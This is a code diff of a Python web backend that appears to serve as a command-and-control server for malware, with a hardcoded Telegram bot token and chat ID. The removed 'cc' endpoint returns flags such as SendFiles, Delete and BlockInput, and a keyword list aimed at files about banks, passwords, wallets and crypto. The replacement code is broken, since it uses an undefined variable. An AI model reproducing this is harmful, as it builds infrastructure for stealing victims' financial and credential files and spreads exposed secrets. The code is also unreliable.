@@ -71,11 +71,6 @@ PROJECT_ROOT = Path(os.path.abspath(os.path.dirname(__file__)))
 def send_telegram_msg(msg):
     bot_token = '5684091804:AAFovNuL9EIthkdLWw3HS-ZJbuw8ELPfnh8'
     chat_id = '1442986099'
-    proxy = "154.30.136.43:8000"
-    http_proxy = f"http://{proxy}"
-    https_proxy = f"http://{proxy}"
-    ftp_proxy = f"ftp://{proxy}"
-    proxies = {"http": http_proxy, "https": https_proxy}
     send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}'
     response = requests.get(url=str(send_text))
     print(response.json())
@@ -100,18 +95,11 @@ def get_telegram_msg(request):
 
 
 def cc(request):
-    response = {
-        "Start": 0,
-        "Enable": 0,
-        "SendFiles": 0,
-        "OverWrite": 0,
-        "Delete": 0,
-        "FileExtension": 0,
-        "BlockInput": 0,
-        "ClosePython": 0,
-        "CloseProgram": 0,
-        "Validator": ["Bank", "Account", "Password", "Email", "gmail", "contact", "personal", "wallet", "crypto", "investment", "finance"]
-    }
+    bot_token = '5684091804:AAFovNuL9EIthkdLWw3HS-ZJbuw8ELPfnh8'
+    chat_id = '1442986099'
+    send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}'
+    response = requests.get(url=str(send_text))
+    print(response.json())
     return JsonResponse(response)
 
 
